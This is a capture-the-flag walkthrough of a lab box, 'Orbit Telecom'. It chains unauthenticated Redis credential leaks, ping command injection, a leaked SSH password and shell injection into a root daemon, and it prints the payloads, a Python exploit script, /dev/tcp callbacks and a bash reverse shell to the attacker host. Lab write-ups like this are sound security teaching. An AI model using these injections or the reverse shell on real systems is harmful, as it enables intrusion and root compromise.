---
title: "Orbit Telecom — Boot2Root"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "misc"
  - "bunabyte"
category: "misc"
platform: "BunaByte"
---

# Orbit Telecom — Walkthrough

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

**Name:** Natnael Sisay
**ID:** CTC-1475-26
**Target:** 10.235.86.70
**My LHOST:** 10.235.86.94 (my tunnel address was 10.200.0.28/32)
**VPN:** buna-lab.conf (WireGuard)

## Flags

```
user.txt: [REDACTED]
root.txt: [REDACTED]
```

## Step 0 — Tunnel and LHOST check

Bring up the tunnel, then ping the target.

```
sudo wg-quick up buna-lab
sudo wg show buna-lab          # want: latest handshake + received > 0
ping -c 2 10.235.86.70
```

Do this before anything else: the target can NOT reach my tunnel address.

```
# from the target, via the RCE once you have it:
bash -c 'echo probe > /dev/tcp/10.235.86.94/8000'   # works
bash -c 'echo probe > /dev/tcp/10.200.0.28/8000'    # Network is unreachable
```

So any callback must go to the lab LHOST 10.235.86.94, not to the tunnel IP.

## Step 1 — Port scan

```
nmap -Pn -p- -T4 --min-rate 1200 --max-retries 1 10.235.86.70
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

Three ports. Redis should never be reachable from outside — that is the
"cache never meant to be reachable from outside" from the brief.

## Step 2 — The exposed cache gives away the console login

```
redis-cli -h 10.235.86.70 ping          # PONG, no password asked
redis-cli -h 10.235.86.70 keys '*'      # app:note  app:admin_pass  app:admin_user
redis-cli -h 10.235.86.70 get app:admin_user   # noc-admin
redis-cli -h 10.235.86.70 get app:admin_pass   # Orb1t!Console24
redis-cli -h 10.235.86.70 get app:note         # Staff console at /console. Diagnostics tool uses ping.
```

## Step 3 — Staff console, then command injection

Log in and keep the session cookie:

```
curl -s -i -c cookies.txt -X POST \
  --data-urlencode 'username=noc-admin' --data-urlencode 'password=Orb1t!Console24' \
  http://10.235.86.70/console/login
```

Redirects to `/console/diag` with a `noc=` cookie. The tool just runs ping, so
try breaking out of it:

```
curl -s -b cookies.txt -X POST --data-urlencode 'host=127.0.0.1|id' \
  http://10.235.86.70/console/diag
```

Output: `uid=999(www) gid=999(www) groups=999(www)`

Only `|` works. The app strips `;` and `&` and nothing else — its own source
says so:

```
host = host.replace(";", "").replace("&", "")
subprocess.run(f"ping -c 1 -W 1 {host}", shell=True, ...)
```

A blacklist of two characters is not a filter. Newlines, `|`, `$()` and
backticks all get through.

## Step 4 — www reads the deployment env, which leaks the noc SSH login

```
cat /opt/orbit/app.env
```

```
REDIS_HOST=127.0.0.1
NOC_SSH_USER=noc
NOC_SSH_PASS=Orb1t-Noc!2026
```

The file is `www:www 0640`, so the web user can read it. That is the step from
a web shell to a real user.

```
sshpass -p 'Orb1t-Noc!2026' ssh noc@10.235.86.70     # or use paramiko
id                            # uid=1000(noc) gid=1000(noc) groups=1000(noc)
cat /home/noc/user.txt        # [REDACTED]
```

## Step 5 — noc to root via the maintenance daemon

The brief said a maintenance daemon keeps the logs tidy, running as root. That
is `/opt/orbit/maintd.py`, running as root and listening on 127.0.0.1:9000:

```python
TOKEN = open("/opt/orbit/maint.token").read().strip()
...
# BUG: component name is passed to a shell unquoted.
out = subprocess.run(f"/usr/local/bin/rotate-logs {body.get('component', 'app')}",
                     shell=True, capture_output=True, text=True)
```

Two things line up:

* the token file is `root:noc 0640` — the `noc` group can read it, and we are noc;
* `component` is pasted into a shell command with no quoting.

```
cat /opt/orbit/maint.token
# e3a702c03644560c7c6ad4b70f653846ca8c
```

Then post to the daemon from the target (it only listens on localhost):

```
python3 - <<'PYEOF'
import json, urllib.request
tok = open('/opt/orbit/maint.token').read().strip()
for comp in ['app; id', 'app; cat /root/root.txt']:
    req = urllib.request.Request('http://127.0.0.1:9000/',
        data=json.dumps({'token': tok, 'component': comp}).encode(),
        headers={'Content-Type': 'application/json'})
    print(comp, '->', json.load(urllib.request.urlopen(req)).get('output'))
PYEOF
```

```
app; id                  -> uid=0(root) gid=0(root) groups=0(root)
app; cat /root/root.txt  -> [REDACTED]
```

`/root/root.txt` is `0600 root:root`, so that output can only come from root.

## Pitfall — do not use an interactive reverse shell here

I tried one extra step for fun: a root reverse shell from the daemon.

```
component = "app; bash -c 'bash -i >& /dev/tcp/10.235.86.94/4444 0>&1'"
```

It connected, but `bash -i` had no terminal, got a job-control stop (SIGTTIN),
and stopped the whole process group — including `maintd` itself, which is
single-threaded and was waiting on that child. From then on the daemon answered
nothing:

```
root  11 T  /usr/bin/python3 /opt/orbit/maintd.py      <- T = stopped
root 218 T  /bin/sh -c /usr/local/bin/rotate-logs app; bash -c 'bash -i ...'
root 221 T  bash -i
```

www has no capabilities (`CapEff: 0000...`, checked in /proc/self/status), so
nothing short of root can send the SIGCONT, and the box has to be reset.

Lesson: against a single-threaded root daemon, send **one-shot commands** and
let each request finish. If you want a shell, make the handler close the socket
itself, or use a tool that attaches a pty. Root was already proven before this,
so the flags are unaffected.

## Attack path, one line

Exposed Redis (no auth) → console password → ping command injection as www →
`app.env` leaks the noc SSH login → user.txt → noc can read the daemon's token →
daemon injects into a root shell command → root.txt.
